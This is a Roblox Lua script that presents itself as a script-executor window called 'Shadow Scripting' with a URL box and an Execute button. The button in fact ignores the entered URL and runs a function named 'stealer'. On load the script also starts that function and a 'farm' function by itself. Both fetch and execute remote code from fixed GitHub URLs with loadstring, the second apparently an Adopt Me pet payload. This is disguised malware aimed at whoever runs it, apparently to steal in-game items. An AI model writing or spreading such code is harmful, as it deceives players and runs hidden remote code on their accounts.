local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

-- Create UI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TitleLabel = Instance.new("TextLabel")
local TextBox = Instance.new("TextBox")
local ExecuteButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 250, 0, 150)
Frame.Position = UDim2.new(0.5, -125, 0.4, 0)
Frame.BackgroundColor3 = Color3.fromRGB(173, 216, 230)
Frame.BorderSizePixel = 3

TitleLabel.Parent = Frame
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.Position = UDim2.new(0, 0, 0, 0)
TitleLabel.Text = "Shadow Scripting"
TitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.TextScaled = true

TextBox.Parent = Frame
TextBox.Size = UDim2.new(0.9, 0, 0, 30)
TextBox.Position = UDim2.new(0.05, 0, 0.3, 0)
TextBox.PlaceholderText = "Enter script URL"
TextBox.Text = ""

ExecuteButton.Parent = Frame
ExecuteButton.Size = UDim2.new(0.9, 0, 0, 30)
ExecuteButton.Position = UDim2.new(0.05, 0, 0.6, 0)
ExecuteButton.Text = "Execute"
ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)

CloseButton.Parent = Frame
CloseButton.Size = UDim2.new(0.9, 0, 0, 30)
CloseButton.Position = UDim2.new(0.05, 0, 0.85, 0)
CloseButton.Text = "Close"
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/script.lua'))()
end

ExecuteButton.MouseButton1Click:Connect(stealer)

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting/refs/heads/main/adoptmepetsppawner'))()
end

task.spawn(stealer)
task.spawn(farm)
